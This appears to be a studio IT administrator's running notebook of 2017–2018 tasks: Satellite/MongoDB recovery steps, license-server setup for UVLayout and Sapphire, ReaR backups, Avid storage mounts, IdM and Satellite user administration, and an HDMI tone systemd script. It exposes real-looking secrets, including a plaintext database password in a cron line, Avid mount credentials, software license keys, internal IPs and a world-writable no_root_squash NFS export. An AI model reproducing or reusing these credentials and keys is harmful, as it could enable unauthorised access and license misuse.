@@@ Legal hold
@@@ login to admin.google

Users => Users => Select User => tools => (More) => Vault => Reports => User Holds
%%%%%

Retention:
https://support.google.com/vault/answer/2535539?hl=en

1 create test ou (Erim)
2 create test accounts (dontestwiggy and gracie)
3 populate account with email from 2015   (change date on other box and use email -s)
4 create + populate folders
5 set retention policy for that ou



******************************************************************************************************
10May17  satellite recover mongodb steps (RH cae# 01837191)

	 on 24Apr17 I had done a katello backup to /disney/depts/tech/systems/backops/chug/
	 on chug as root 
	 katello-backup --skip-pulp-content /disney/depts/tech/systems/backops/chug/katello-backup/ # and I made the dated directory


Marineau, Christian on May 08 2017 at 02:37 PM -07:00
Hi.

Please run the following steps and see if this resolves your pulp issue. Please share all output via the case.

1. Stop the Satellite services
   # katello-service stop

2. Check disk usage and available space for mongodb directory.
   # du -hs /var/lib/mongodb
   # df -h /var/lib/mongodb

3. Move the actual mongodb directory. We want to keep the files just in case. 
   Important: Adjust the destination to specify a place with enough space.
   # mv /var/lib/mongodb /var/lib/mongodb.backup

4. Decompress the files
   # cd /
   # tar xvf /disney/depts/tech/systems/backops/chug/katello-backup/20170424/mongo_data.tar.gz
   # restorecon -R /var/lib/mongodb

5. Run the mongo repair
   # chown -R mongodb /disney/depts/tech/systems/chug/mongodb-repair
   # sudo -u mongodb mongod --dbpath /var/lib/mongodb --repair --repairpath /disney/depts/tech/systems/chug/mongodb-repair
   # restorecon -R /var/lib/mongodb
   
6. Start mongod
   # systemctl start mongod

7. Migrate Pulp database
   # sudo -u apache /usr/bin/pulp-manage-db

8. Restart the Satellite services
   # katello-service restart

9. Check the status
   # hammer ping

Best regards

-Christian

((((()))))

@@@ lumping other commands from this ticket in here for referrence
@@@ they asked for a copy of the failing mongodb and thi is the commend they sent to tar it up.....
tar --selinux --create --gzip --file=mongo_data.tar.gz --exclude=mongod.lock /var/lib/mongodb/

((((()))))

******************************************************************************************************
11May17  Google mail support (before calling)

from google admin 

Main Menu
  Support
    Contact Support
      GET PIN

@@@ from Grace
Try this guy: Jacob Kramer `jmkramer@google.com`
[4:03] 
he is the Disney google rep
******************************************************************************************************
17May17 retention rules implemented 10:28AM

~dsiegfriedt/JOBS/DISNEYTS/KEEP/17May17-mail-setup.jpg

https://techweb.disneyanimation.com/docs/DOC-32752  @@@need to use my disneyanimation login (dsiegfri, d...)

https://ediscovery.google.com

******************************************************************************************************
17May17 syncIQ  Grace

https://theorem.disneytoonstudios.com:8080

root
N...

login
	data Protection -> synciq -> Policies "Create a SyncIQ Policy"

******************************************************************************************************
17May17 automount maps  Grace

login to idm web page
      Network Services
      	      Default
		auto_disney
@@@ latest one is "reviews" to mount corollary to /disney/reviews
******************************************************************************************************
NUKE license specifics

Nuke requires a nuke_i license

NukeX requires a nuke_i and a nukex_i license

NukeStudio requires a nuke_i, nukex_i and nukestudio_i licenses

NukeAssist requires a nukexassist_i license

Rendering a Nuke script from a terminal or command prompt requests a nuke_r license by default


******************************************************************************************************
25May17  --siggy uvlayout ( headus )

Below are downloads of the Professional version of UVLayout for Linux. For 64bit OSs only. See Installation_Guide:_Linux for full installation instructions.

File	   	       	   		Description	   	       Last Modified	   	       Size (bytes)	   
uvlayout-pro-2.10.00-f13.64.tgz		Importing and Lightmaps		2016-10-31 15:22		10,827,542
uvlayout-pro-2.09.04-f13.64.tgz		Camera Driven Local Scaling	2016-05-31 16:37		10,780,215
uvlayout-pro-2.09.03-f13.64.tgz		Tiles Selecting			2016-03-25 09:58		10,666,695
uvlayout-pro-2.09.02-f10.64.tgz		Groups Editing			2015-12-16 18:02		10,259,161

md5sum.txt				File Checksums			2016-10-31 16:13		264

Note: To grab a binary file, first move the mouse pointer over the link, click the right mouse button, then select "Save Link As..." or "Save Target As...".

@@@ downloaded and untared 2.10 in /disney/apps/uvlayout

dsiegfriedt@dts3329:~ $ /disney/apps/uvlayout/uvlayout-pro-2.10/bin/headus
/disney/apps/uvlayout/uvlayout-pro-2.10/bin/headus: error while loading shared libraries: libGLEW.so.1.5: cannot open shared object file: No such file or directory
dsiegfriedt@dts3329:~ $ 

@@@steps from email 18Oct16 between Chris and myself
What I have done:
1) export HEADUS_HOME=/disney/apps/uvlayout/uvlayout-pro-2.10
2) export PATH=$HEADUS_HOME/bin:$PATH
3) dsiegfriedt@dts3329:/usr/lib64 $ sudo ln -s libGLEW.so.1.10.0 libGLEW.so.1.5
4) headus

[root@dipper ~]# less /var/log/messages
[root@dipper ~]# chkconfig --list | grep hl
hlserver       	0:off	1:off	2:off	3:on	4:on	5:on	6:off

[root@dipper ~]# ps -ef | grep hlserver
root      7328     1  0 15:19 ?        00:00:00 /opt/hlserver/hlserver -d -c,/opt/hlserver/hlserver.conf -l,2,7,/opt/hlserver/hlserver-%d.log


vim /opt/hlserver/hlserver.conf
@@@ changed GROUP lan *.*.*.* to GROUP lan 10.106.*.*

/disney/apps/uvlayout/uvlayout-pro-2.10/bin/hlmanager
Trying root@localhost ... Connected ... Fetching ...
Server v2.2 localhost up 01:13
<--------- Licenses ---------->
Name        Status    Free Used
uvlayoutv2  expired      2    0
> quit

/disney/apps/uvlayout/uvlayout-pro-2.10/bin/uvlayout-pro-2.09/bin/hlmanager 
Trying root@localhost ... Connected ... Fetching ...
Server localhost up 1 hour, 17 minutes and 4 seconds
<--------- Licenses ---------->  <------------------------- Users ------------------------->
Name        Status    Free Used  Id Hostname        User     App           Age       Idle   
uvlayoutv2  expired      2    0
> exit

26May17  --siggy
/user/lib64
libGLEW.so.1.5 -> libGLEW.so.1.10.0

dsiegfriedt@dts3329:~ $ /disney/apps/uvlayout/uvlayout-pro-2.10/bin/uvlayout 
cysliceP: error while loading shared libraries: libIlmImf.so.6: cannot open shared object file: No such file or directory

libIlmImf.so.6 -> libIlmImf.so.7.0.0

dsiegfriedt@dts3329:~ $ /disney/apps/uvlayout/uvlayout-pro-2.10/bin/uvlayout 
uvlayoutP: License not found, or expired, for uvlayoutP v2.10.00

	If you don't have a key yet, or wish to 
	extend your license, contact your vendor 
	and quote them this code string. 

First time code string : 

	row 1 : a1 c2 00 8d f0
	row 2 : db 63 75 f7 aa
	row 3 : c6 5c 16 17 4f
	row 4 : ee 06 15 d8 e1
	row 5 : 30 87 a0 73 ca

Copy of above code: '/tmp/uvlayoutP-code.txt'

Keys filename: '/disney/apps/uvlayout/uvlayout-pro-2.10/lib/.keys'

2.09
dsiegfriedt@dts3329:~ $ cat /disney/apps/uvlayout/uvlayout-pro-2.09/lib/.keys 
7CWT ZEKR QNPJ LADK ZZFB P923 XKH5 N6BD PMP8 YBSA # 161118 [000 2]

2.10
dsiegfriedt@dts3329:~ $ cat /disney/apps/uvlayout/uvlayout-pro-2.10/lib/.keys 
cat: /disney/apps/uvlayout/uvlayout-pro-2.10/lib/.keys: No such file or directory

((((()))))

http://www.uvlayout.com/index.php?option=com_user&task=UserDetails&Itemid=21

License ID:	  	56920f87

Software:	  	UVLayout Professional
License Type:		Permanent Float x 2
License Keys:		
  # hlserver,uvlayoutv2 sysid=56920f87 expire=perm [000 2]  
  0PNB SK9K GNY5 SZ3L ZJER 4HEE 9CX0 QZ5Q # 15500  
  MLZG RCHT QXY6 TSFP W6NB M11C KR59 M2B5 MYZ2 M63A # 15501  
((((()))))

http://www.uvlayout.com/index.php?option=com_wrapper&Itemid=58

To install you need to read and follow the instructions in the HLServer User Guide. In summary:
1] Install and run HLServer according to the OS specific instructions: Windows, Linux, OS X.
2] Email us the code string generated by HLManager when you connect up to the license server.
3] We will then email the license keys, which you will need to add to the keys file on the server; you can use the HLManager 'add' command to do this.
4] Configure UVLayout on the client workstations so it knows where to look for the floating licenses. See Application Config for more information.

@@@Application config

http://www.headus.com/doc/HLServer:_Application_Config

Note: Normally the host port number can be left off if you use the default of "PORT 11668" in hlserver.conf. If a different port has been used, or you are using older client applications, then it needs to be added to the hostname with a colon, as in host:port (e.g. "server:11668").

http://www.headus.com/doc/HLServer:_Adding_New_Keys


[root@dipper uvlayout-pro-2.10]# bin/headus
bin/headus: error while loading shared libraries: libXm.so.4: cannot open shared object file: No such file or directory
@@@IDIOT!!! can't run it on dipper

@@@ sent email to jill@headus.com.au for help.
@@@ mail back from Phil

30May17

http://www.headus.com/doc/HLServer:_Application_Config

[root@dipper hlserver]# ./hlmanager add
Trying root@localhost ... Connected ... Fetching ...
Enter key string below ...
0PNB SK9K GNY5 SZ3L ZJER 4HEE 9CX0 QZ5Q # 15500
Sending key to server ...
Updating status ...
Server v2.2 localhost up 3 days, 20:03
<--------- Licenses ---------->
Name        Status    Free Used
uvlayoutv2  expired      2    0
[root@dipper hlserver]# ./hlmanager add
Trying root@localhost ... Connected ... Fetching ...
Enter key string below ...
MLZG RCHT QXY6 TSFP W6NB M11C KR59 M2B5 MYZ2 M63A # 15501
Sending key to server ...
Updating status ...
Server v2.2 localhost up 3 days, 20:03
<--------- Licenses ---------->
Name        Status    Free Used
uvlayoutv2  expired      2    0

@@@ email back to Phil

31May17

@@@email back from Phil (architec@headus.com.au) with NEW 30 day temp licenses.

hlmanager add
Trying root@localhost ... Connected ... Fetching ...
Enter key string below ...
X1WQ ZZLY EM2A T6RL 6BS7 SKWX YCH4 5W3B A11M ZZJA # 170630 [000 2]
Sending key to server ...
Updating status ...

Server v2.2 localhost up 01:46
<--------- Licenses ---------->
Name        Status    Free Used
uvlayoutv2  29 days      2    0


WORKS

1Jun17
================================
Changes needed to run uvlayout

1) export HEADUS_HOME=/disney/apps/uvlayout/uvlayout-pro-2.10
2) export PATH=$HEADUS_HOME/bin:$PATH
3) cd /usr/lib64 ; sudo ln -s libGLEW.so.1.10.0 libGLEW.so.1.5
4) cd /usr/lib64 ; sudo ln -s libIlmImf.so.7.0.0 libIlmImf.so.6
5) headus

@@@ created in your  home account when you run headus
 ll ~/.headus/
total 62K
drwx------.  2 dsiegfriedt prodctn   29 Jun  1 09:12 .
drwxrwxr-x. 67 dsiegfriedt prodctn 3.2K Jun  1 09:11 ..
-rw-r--r--.  1 dsiegfriedt prodctn  141 Jun  1 09:12 preferences
dsiegfriedt@dts3329:~/JOBS/DISNEYTS/DEADLINE/DEADLINE9 $ cat ~/.headus/preferences 
*:S1:0
*:Author:headus 3D tools
*:Browser:browser
*:HLServer:10.106.228.32
*:Temp Dir:???
*:Restore Dir:???
headus:ReadUV1:0
headus:Fix001:1

6) uvlayout

================================
@@@ if you do not have a ~/.headus you will get the following error
@@@ because it i s looking locally for the license

uvlayout
uvlayoutP: License not found, or expired, for uvlayoutP v2.10.00

	If you don't have a key yet, or wish to 
	extend your license, contact your vendor 
	and quote them this code string. 

First time code string : 

	row 1 : 8e ed 2f a2 4c
	row 2 : f4 4c 5c de 7a
	row 3 : ef 75 39 38 d5
	row 4 : c1 29 3a f7 1b
	row 5 : 32 d7 fe af b6

Copy of above code: '/tmp/uvlayoutP-code.txt'

Keys filename: '/disney/apps/uvlayout/uvlayout-pro-2.10/lib/.keys'

21Jun17 NEW permenent license from Phil

login to uvlayout.com
under support => Details (on the left side) you will see the license string

@@@ shows where the license string is....
dsiegfriedt@dts3329:~/JOBS/DISNEYTS/UVLayout $ import NEW-licenses-21jun17.jpg

@@@ on dipper as root

[root@dipper ~]# cd /opt/hlserver/

[root@dipper hlserver]# ./hlmanager add
Trying root@localhost ... Connected ... Fetching ...
Enter key string below ...
JK89 NZ5A 94M7 KEB6 1W12 C3ZM C5KQ KJQR S1GA GXAA # [000 2] 
Sending key to server ...
Updating status ...
Server v2.2 localhost up 21 days, 13:35
<--------- Licenses ---------->
Name        Status    Free Used
uvlayoutv2  permanent    2    0
[root@dipper hlserver]# 

******************************************************************************************************
5Jun17  satellite upgrade error  started 24Apr17 ended 5Jun17

@@@progress of ticket can be found:
/disney/home/dsiegfriedt/JOBS/DISNEYTS/SATELLITE/satellit-upgrade-01837191-24Apr17

http://projects.theforeman.org/projects/foreman/wiki/Troubleshooting

******************************************************************************************************
19Jun17  Adding drives to Chug
@@@ HP DL380 Gen9
@@@ needed additional space ordered 2-P/-BN  (480GB SSATA SSD 2.5 SC) 
@@@ needed to figure out where to install the drives 
@@@ From:
http://h20628.www2.hp.com/km-ext/kmcsdirect/emr_na-c04436966-5.pdf
@@@ page 19

@@@ Before chug had 
1 2 3 4 5 6 7 8
^ ^     ^ ^

@@@ After (proposed)
1 2 3 4 5 6 7 8
^ ^ ^ ^ ^ ^ ^ ^

@@@ completed 14Sep17

don.siegfriedt [10:00 AM]
how much do you want me to add to chug:/   ?
[10:00]
it is 79G now
gracet 
 [10:06 AM]
just add all the disks
[10:06]
i think we have 4
[10:07]
maybe create a new partition /satellite
[10:07]
so we can separate /satellite crap from OS
don.siegfriedt [10:32 AM]
OK   Your wish is my command
don.siegfriedt [10:43 AM]
OK so we never plugged in the 4 drives we ordered (they were in storage).  If it is OK I am going to wait till Monday night to plug them in.
[10:44]
they are hot pluggable but I don't want to chance it
gracet 
 [10:50 AM]
They are hot plug. Im sure it's ok
don.siegfriedt [10:51 AM]
OK but I'm blaming you :^D
[10:52]
you want all 4 in chug or just 2?
gracet  [10:52 AM]
What is the drive capacity?
don.siegfriedt [10:53 AM]
480G each
gracet 
 [10:54 AM]
Put all 4 , then Raid 10. Then we'll migrate mongodb to this partition later. What do you think?

******************************************************************************************************
20Jun17   rear (RedHat) relax and recover 

https://access.redhat.com/solutions/2115051

[root@dts3329 ~]# time rear -d -v mkbackup
Relax-and-Recover 1.17.2 / Git
Using log file: /var/log/rear/rear-dts3329.log
mkdir: created directory '/var/lib/rear/output'
Creating disk layout
Creating root filesystem layout
Copying files and directories
Copying binaries and libraries
Copying kernel modules
Creating initramfs
Making ISO image
Wrote ISO image: /var/lib/rear/output/rear-dts3329.iso (120M)
Copying resulting files to nfs location
Encrypting disabled
Creating tar archive '/tmp/rear.QIejSAyY7kE5IUs/outputfs/dts3329/backup.tar.gz'
Archived 6280 MiB [avg 3466 KiB/sec]OK
Archived 6280 MiB in 1856 seconds [avg 3464 KiB/sec]
You should also rm -Rf /tmp/rear.QIejSAyY7kE5IUs

real	31m41.176s
user	18m3.300s
sys	12m32.340s

@@@ looks like I want some different options....
       mkbackup
           create rescue media and backup the system (only for internal backup
           methods)
       validate
           submit validation information

25Jun17  

@@@shit I forgot to put in here
/etc/rear/local.config

Possible configuration values can be found in /usr/share/rear/conf/default.conf

@@@ this is what I did for dipper (some stuff I don't care to backup)
[root@dipper ~]# cat /etc/rear/local.conf 
# Default is to create Relax-and-Recover rescue media as ISO image
# set OUTPUT to change that
# set BACKUP to activate an automated (backup and) restore of your data
# Possible configuration values can be found in /usr/share/rear/conf/default.conf
#
# This file (local.conf) is intended for manual configuration. For configuration
# through packages and other automated means we recommend creating a new
# file named site.conf next to this file and to leave the local.conf as it is. 
# Our packages will never ship with a site.conf.

OUTPUT=ISO
OUTPUT_URL=nfs://10.106.228.32/storage
BACKUP=NETFS
BACKUP_URL=nfs://10.106.228.32/storage
BACKUP_PROG_EXCLUDE=("${BACKUP_PROG_EXCLUDE[@]}" '/media' '/var/tmp' '/var/crash' '/disney' '/disk1' '/scratch' '/scratch2' '/share' )
#NETFS_KEEP_OLD_BACKUP_COPY=

@@@ have to add /storage


[root@dipper ~]# cat /etc/exports 
/storage        *(fsid=0,rw,sync,no_root_squash,no_subtree_check,crossmnt)
[root@dipper ~]# 

@@@ then did a: 
time rear -d -v mkbackup

elax-and-Recover 1.17.2 / Git
Using log file: /var/log/rear/rear-dipper.log
Creating disk layout
Creating root filesystem layout
Copying files and directories
Copying binaries and libraries
Copying kernel modules
Creating initramfs
Making ISO image
Wrote ISO image: /var/lib/rear/output/rear-dipper.iso (82M)
Copying resulting files to nfs location
Encrypting disabled
Creating tar archive '/tmp/rear.nlBvegnScSv048L/outputfs/dipper/backup.tar.gz'
rchived 4515 MiB [avg 3407 KiB/sec]OK
Archived 4515 MiB in 1358 seconds [avg 3404 KiB/sec]
You should also rm -Rf /tmp/rear.nlBvegnScSv048L

real	22m58.863s
user	12m54.271s
sys	10m37.083s
[root@dipper ~]# rm -Rf /tmp/rear.nlBvegnScSv048L
[root@dipper ~]# 


******************************************************************************************************
7Oct17  dhcpd log location change

https://lists.isc.org/pipermail/dhcp-users/2009-January/008272.html

I have set my system (F9) up to use syslog (actually an update to Fedora 9 
changed it to rsyslog ??) as Randy suggests. It needed an option in 
/etc/dhcpd.conf -->
log-facility local1;   # per /etc/rsyslog.conf setting

and an entry in /etc/rsyslog.conf -->
# log dhcpd per /etc/dhcpd.conf
local1.*						/var/log/dhcpdlog

I also stopped it from logging in /var/log/messages by this in 
/etc/rsyslog.conf-->
# Log anything (except mail) of level info or higher.
# Don't log private authentication messages!
*.info;mail.none;authpriv.none;cron.none;local1.none   /var/log/messages
                                          ^^^^^^^^^^^
Your system may vary though.

@@@ WORKED

******************************************************************************************************
18Jul17  avid

ssh avid-nbu

IP of ISIS storage = 192.168.32.10

IP of avid-nbu (net back up) 192.168.34.231

mkdir /avid

EXAMPLES
       Mount workspace editor with ISIS user John.  The Virtual System Director name is AvidISIS.
       mount.avidfos John:password@AvidISIS/editor /mnt/editor
@@@ in our case it looks like:
  mount.avidfos backup:Backup@dts-isis/<project name> <mount point>

mount.avidfos backup:Backup@dts-isis/$i /mnt

@@@ works (would not mount on /mnt or /mnt/linux but will mount on a newly created directory
mount.avidfos backup:Backup@dts-isis/cw04_project /cow

[root@avid-nbu ~]# for i in `cat namesONLY.txt`; do echo $i; mount.avidfos backup:Backup@dts-isis/$i /cow; ll -rt /cow; umount /cow; echo; done > longlisting-avid-dirs-18jul17.txt

27Jul17  @@@ looking to get size of all the dirs
for i in `cat namesONLY.txt`; do echo $i; mount.avidfos backup:Backup@dts-isis/$i /cow; du -sh $i; umount /cow; echo; done > sizeofeachdir-27Jul17
 
29Jul17 @@@ figured out how to find the size for avid backup....
mount.avidfos backup:Backup@dts-isis/ /siggy

[root@avid-nbu ~]# du -sh /siggy
26T	/siggy
[root@avid-nbu ~]# 

=============

[root@avid-nbu ~]# nslookup dts-avid
Server:		10.106.228.19
Address:	10.106.228.19#53

Name:	dts-avid.disneytoonstudios.com
Address: 10.106.224.159

[root@avid-nbu ~]# 

7Dec17 
@@@ need to mount everything after reboot.....
@@@ found this in history

mount.avidfos backup:Backup@dts-isis:/CW04_Project /avid

NOPE

@@@ I think dts-avid is not online
@@@ can't ping dts-isis
@@@ can't ping 192.168.32.10

@@@ can't ping dts-avid
@@@ can't ping 10.106.224.159

8Dec17

@@@ dts-avid-backup IP address = 10.103.80.87
@@@ on dts-avid-backup isis IP shows as 192.168.32.233

@@@ sent email to Gabe..... 

The isis client manager mounts all that shite

The manager was open

click on DTS-ISIS
      asks for a password

TAHDAH

@@@ doesn't seem to be a way to ssh to this machine

=============

******************************************************************************************************
22Jul17 cron based backups
dipper   59 11 1 * * /root/monthly-license-backup.bash
DEST = /disney/depts/tech/systems/backops/licenses/DIPPER/

idm01  # no longer in place
-rwxr-xr-x. 1 root root 368 Jul  4 22:57 /root/backup-ipa.bash
DEST = /disney/depts/tech/systems/backops/idm/

20Mar18
mayday
0 20 * * 1 /usr/bin/mysqldump -ubackupadmin -pbackAdmin! zabbix > /DB/mariadb/10.0/p3306/backups/zabbix.sql

idm04  # see 20Mar18 for cat of backup-ipa.bash
0 21 * * 1 /root/backup-ipa.bash
DEST = /disney/depts/tech/systems/backops/idm/

******************************************************************************************************
26Jul17 dts3007 findings

-(1) /disney = empty  (home dir created when logged in with my name)
+(2) mkdir /disney/dist
+(3) mount theorem.disneytoonstudios.com:/ifs/data/disney/dist   on  /disney/dist
-(4) NO dts.repo (scp -r dts3329:/etc/yum.repos.d/dts.repo /etc/yum.repos.d/)
-(5) gdm not installed
+(6) yum install puppet
+(7) edit /etc/puppet/puppet.conf  (server          = chug.disneytoonstudios.com)
+(7a) puppet agent --test
-(8) rm agent_catalog_run.lock
+(9) idm_regist
     @@@ optional domainname disneytoonstudios.com

reboot :^( rebooted too soon puppet was still installing stuff

******************************************************************************************************
31Jul17  mount.avidfos backup:Backup@dts-isis/ /avid
vidfos persistant over reboot

email sent to Gabe.... if he has nothing I'll put the mount command in rc.local


******************************************************************************************************
2Aug17  Joel's IP list  (DTS IP Space)
https://docs.google.com/spreadsheets/d/1q-jw9TxCWfqiy5kq2ZBcxx15xP4mgn18IkiohGhD0mQ/edit?ts=589a0601#gid=7238943

******************************************************************************************************
2Aug17 adding someone to sudoers (Maya to be specific)

brows to 
idm01.disneytoonstudios.com/ipa/ui

Log in => User Groups => admins => "+Add" => <select (check box) user> => ">" => Add (bottom)

@@@ to check
select user (click) => Sudo Rules (Tab) => view listing (click)

... add kjaffe, and acheney add to developer group
Log in => Identity/User Groups => developer => "+Add" => <select (check box) user> => ">" => Add (bottom)

******************************************************************************************************
3Aug17  deactivating a slack account 

https://get.slack.help/hc/en-us/articles/204475027-Deactivate-a-team-member-s-account

@@@ go here IF you are on the admin list
https://disneytoonstudios.slack.com/admin

******************************************************************************************************
7Aug17 iptables

**********************************

MAKE SURE YOU CHECK THE VERSION

**********************************


@@@ to add "DROP" logging to crophopper
http://www.thegeekstuff.com/2012/08/iptables-log-packets/?utm_source=feedburner

@@@ doing these steps wedged chrophopper   
@@@ service iptables stop fixed the wedge

@@@
https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules


@@@ check what is active
iptables -L -n --line-numbers

@@@
-A, --append 
-L, --list
-X, --delete-chain
-S, --list-rules
-F, --flush

@@@ file location

less /etc/rsyslog.conf 

less /var/log/iptables.log 

less /etc/sysconfig/iptables-config 

ll /etc/sysconfig/iptables

less /etc/sysconfig/iptables


******************************************************************************************************
8Aug17   Isilon error logs!!??
less /ifs/data/Isilon_Support/phone_home/data/2017-08-08_0000-cluster_full_disk.log

From:
theorem:/ifs/data/disney/shows/tumbl/dpix/repository

To:
corollary:/ifs/data/disney/reviews/tumbl/dpix/repository

@@@ EFin POS!
https://onlinesupport.emc.com
SR# 08167729

******************************************************************************************************
8Aug17 URL of isilon (theorem)

https://10.106.231.54:8080/#Login ( theorem.disneytoonstudios.com )

https://10.106.231.203:8080/#Login ( corollary.disneytoonstudios.com )

******************************************************************************************************
8Aug17   tested hdmi service on dts3329 and superfortress

[root@dts3329 ~]# ll /disney/config/theater/
total 5416
-rw-r--r--. 1 root root     368 Aug  8 12:48 hdmi-pilot-tone.service
-rwxr-xr-x. 1 root root    1366 Aug  8 12:23 hdmi-pilot-tone.sh
-rw-r--r--. 1 root root 4359804 Aug  8 12:18 soundofsilence.wav
-rw-r--r--. 1 root root     391 Aug  8 12:19 wdas-hdmi-pilot-tone.service-ORIG
-rw-r--r--. 1 root root    1368 Aug  8 12:19 wdas-hdmi-pilot-tone.sh-ORIG

/disney/config/theater/hdmi-pilot-tone.sh
[root@dts3329 ~]# cat /disney/config/theater/hdmi-pilot-tone.sh
#!/bin/bash

args=$1

if [[ $args == "" ]]; then
    exit 0
fi

if [[ $args == "start" ]]; then
    logger -s -t $0 "starting the soundofsilence.wav"
    /usr/bin/mplayer -nogui -nolirc -loop 0 /disney/config/theater/soundofsilence.wav </dev/null >/dev/null 2>&1 &
    sleep 1
    pid=`ps -ef | grep soundofsilence.wav | grep -v grep | awk '{print$2}'`
    echo $pid > /var/run/mplayer.pid
    exit 0
fi

if [[ $args == "status" ]]; then
    if [[ -f /var/run/mplayer.pid ]]; then
        pid=`cat /var/run/mplayer.pid`
        echo "mplayer is playing the soundofsilence.wav. PID $pid"
        ps -ef | grep soundofsilence.wav | grep -v grep
        exit 0
    else
        echo "mplayer: soundofsilence.wav is not running."
    fi
    exit 0
fi

if [[ $args == "stop" ]]; then
    logger -s -t $0 "stopping the soundofsolience.wav"
    kill -9 `cat /var/run/mplayer.pid`
    sleep 1
    rm -f /var/run/mplayer.pid
    exit 0
fi

if [[ $args == "restart" ]]; then
    logger -s -t $0 "restarting the soundofsolience.wav"
    kill -9 `cat /var/run/mplayer.pid`
    sleep 1
    rm -f /var/run/mplayer.pid
    /usr/bin/mplayer -nogui -nolirc -loop 0 /disney/config/theater/soundofsilence.wav </dev/null >/dev/null 2>&1 &
    sleep 1
    pid=`ps -ef | grep soundofsilence.wav | grep -v grep | awk '{print$2}'`
    echo $pid > /var/run/mplayer.pid
    exit 0
fi

exit 0
[root@dts3329 ~]# 


/lib/systemd/system/hdmi-pilot-tone.service

[root@dts3329 ~]# cat /lib/systemd/system/hdmi-pilot-tone.service
[Unit]
Description=hdmi-pilot-tone
After=display-manager.service pulseaudio.service

[Service]
Type=forking
ExecStart=/disney/config/theater/hdmi-pilot-tone.sh start
ExecStop=/disney/config/theater/hdmi-pilot-tone.sh stop
ExecReload=/disney/config/theater/hdmi-pilot-tone.sh restart
Restart=always
RestartSec=3
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
[root@dts3329 ~]# 



******************************************************************************************************
16Aug17  adding user to satellite

ssh root@chug
@@@ to select group to add to
[root@chug ~]# hammer user-group list

@@@ to add user
[root@chug ~]# hammer user-group add-user --user sdenduluri --id 1
Could not associate the user:
  Error: user not found

@@@ you may need to have the user login to satellite

@@@ after Suri logged in I got:
[root@chug ~]# hammer user-group add-user --user sdenduluri --id 1
The user has been associated

[root@chug ~]# hammer location list
---|-------
ID | NAME  
---|-------
2  | sonora
---|-------
[root@chug ~]# hammer location add-user --user sdenduluri --id 2
The user has been associated
[root@chug ~]# 
[root@chug ~]# hammer organization list
---|------|-------|-------------------------------------------------------
ID | NAME | LABEL | DESCRIPTION                                           
---|------|-------|-------------------------------------------------------
1  | dts  | dts   |                                                       
3  | test | test  | Organization made for testing satellite bugs and repos
---|------|-------|-------------------------------------------------------
[root@chug ~]# hammer organization add-user --user sdenduluri --id 1
The user has been associated
[root@chug ~]# 

[root@chug ~]# hammer user list

[root@chug ~]# hammer user delete --login gcalvo --id 60
User [gcalvo] deleted
[root@chug ~]# 


[root@chug ~]# hammer user info --id 67

[root@chug ~]# hammer user-group list
---|----------
ID | NAME     
---|----------
3  | developer
1  | systems  
4  | test     
2  | tse      
---|----------
[root@chug ~]# hammer user-group add-user --user sdenduluri --id 1
The user has been associated
[root@chug ~]# 

[root@chug ~]# hammer admin logging --list
-----------|-------------------------------------|-------------------------------------
COMPONENT  | AUTO-DETECTED BY EXISTENCE OF       | DESTINATIONS                        
-----------|-------------------------------------|-------------------------------------
postgresql | /var/lib/pgsql/data/postgresql.conf | syslog /var/lib/pgsql/data/pg_log/  
rails      | /etc/foreman/settings.yaml          | /var/log/foreman/production.log     
proxy      | /etc/foreman-proxy/settings.yml     | /var/log/foreman-proxy/proxy.log    
puppet     | /etc/puppet/puppet.conf             | /var/log/puppet/masterhttp.log      
dhcpd      | /etc/dhcp/dhcpd.conf                | syslog /var/log/dhcpd-debug.log     
named      | /etc/named.conf                     | syslog                              
tftp       | /etc/xinetd.d/tftp                  | syslog                              
qpidd      | /etc/qpid/qpidd.conf                | syslog                              
tomcat     | /etc/candlepin/candlepin.conf       | /var/log/candlepin/ /var/log/tomcat/
pulp       | /etc/pulp/server.conf               | syslog /var/log/pulp-debug.log      
virt-who   | /etc/sysconfig/virt-who             | syslog                              
-----------|-------------------------------------|-------------------------------------
[root@chug ~]# 


******************************************************************************************************
22AAug17 sapphire v10

@@@ email from Grace
Hi Niki,

Thank you for your recent Sapphire purchase with RFX.

Please use the info below to download and Activate your new Sapphire v10 license for Disney Toon Studios.

===
Sapphire v10.0    (2x seats)
7546-8011-2391-5654

Sapphire Render    Sapphire v10.0    (20x renders)
7550-8011-6016-2210
===

Please install and keep this email for your records.

Let me know if you have any questions.

Best Regards,

Andrew Spurbeck
RFX Inc
748 Seward St
Hollywood, CA 90038
323-962-7400
323-962-7444 FAX
andrew@rfx.com

For 64bit systems on RHEL 4 or greater, type:
rpm -Uvh http://files.genarts.com/sapphire/genarts-sapphire-sparks10-10.100-1.x86_64.rpm

@@@ I downloaded the RPM and tore it apart in GENARTS
+++++
@@@ 23Aug17 

[root@dts3329 GENARTS]# cp -r usr /disney/apps/foundry/Nuke10.0v4/
license setup
https://borisfx.com/support/license-instructions
OR
https://borisfx.com/faq/sapphire-license-install-via-command-line-install/
	
@@@ thinking we do this on dipper
	/usr/discreet/sparks/sapphire_10/license-tool/license-tool –activate <KEY>
NO GO (No Va)

http://support.genarts.com/Knowledgebase/Article/View/1646/390/how-do-i-install-my-activation-key-floating-license
@@@ it calls for "hostline"  WTF is that you ask...me too
@@@ less /usr/local/foundry/RLM/foundry.lic the top line looks like what is wanted

@@@ added the following line to:
/disney/apps/foundry/Nuke10.0v4/usr/genarts/rlm/SapphireSparks.lic
@@@ had to make the file as it did not exist

HOST dipper.disneytoonstudios.com a0d3c104563c 4101

28Aug17
You can find and download the installer from here: http://www.genarts.com/support/downloads/sapphire/autodesk.

+++++

https://borisfx.com/support/documentation/sapphire-v10-for-autodesk/#linux


7Sep17 on dts3329
rpm -Uvh http://files.genarts.com/sapphire/genarts-sapphire-sparks10-10.100-1.x86_64.rpm

installed into /usr

dsiegfriedt@dts3329:~ $ ll JOBS/DISNEYTS/GENARTS/usr
total 10K
drwxr-xr-x. 5 dsiegfriedt prodctn 74 Aug 22 17:10 .
drwxr-xr-x. 3 dsiegfriedt prodctn 84 Aug 22 17:10 ..
drwxr-xr-x. 3 dsiegfriedt prodctn 24 Aug 22 17:10 discreet
drwxr-xr-x. 3 dsiegfriedt prodctn 21 Aug 22 17:10 genarts
drwxr-xr-x. 3 dsiegfriedt prodctn 30 Aug 22 17:10 share


8Sep17  

@@@Grace suggested that we create a new license server to spread the load

@@@ dippertwo

@@@ to install the lic server for sapphire

https://borisfx.com/support/documentation/rlm-license-server/#linux

